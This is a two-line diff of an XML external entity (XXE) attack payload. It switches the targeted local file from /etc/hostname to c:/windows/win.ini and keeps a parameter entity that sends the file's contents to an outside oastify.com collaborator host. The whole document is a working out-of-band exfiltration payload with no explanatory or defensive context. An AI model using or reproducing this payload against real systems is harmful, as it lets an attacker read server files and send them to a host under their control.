@@ -1,2 +1,2 @@
-<!ENTITY % stuff SYSTEM "file:///etc/hostname">
+<!ENTITY % stuff SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % param1 "<!ENTITY external SYSTEM 'http://ixjy8gcs9xfrrmqyj70cl5zbl2rtfi.oastify.com/?data=%stuff;'>">
